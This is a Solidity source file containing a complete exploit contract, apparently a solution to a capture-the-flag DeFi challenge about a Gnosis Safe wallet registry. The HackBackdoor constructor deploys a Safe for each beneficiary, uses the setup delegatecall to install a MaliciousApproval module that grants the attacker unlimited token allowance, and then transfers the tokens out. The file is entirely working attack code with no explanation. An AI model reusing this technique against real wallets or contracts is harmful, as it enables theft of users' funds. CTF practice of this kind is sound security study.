// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {WalletRegistry} from "../backdoor/WalletRegistry.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/src/utils/SafeTransferLib.sol";
import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafeProxy} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import {Enum} from "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";

contract HackBackdoor {
    constructor(
        GnosisSafeProxyFactory factory,
        GnosisSafe masterCopy,
        WalletRegistry registry,
        IERC20 token,
        address[] memory users
    ) {
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            bytes memory initializer = abi.encodeCall(
                GnosisSafe.setup,
                (
                    owners,
                    1,
                    address(new MaliciousApproval()),
                    abi.encodeCall(MaliciousApproval.approve, (token, address(this))),
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );
            GnosisSafeProxy proxy = factory.createProxyWithCallback(address(masterCopy), initializer, 1234, registry);

            token.transferFrom(address(proxy), msg.sender, 10e18);
        }
    }
}

contract MaliciousApproval {
    function approve(IERC20 token, address user) external {
        token.approve(user, type(uint256).max);
    }
}
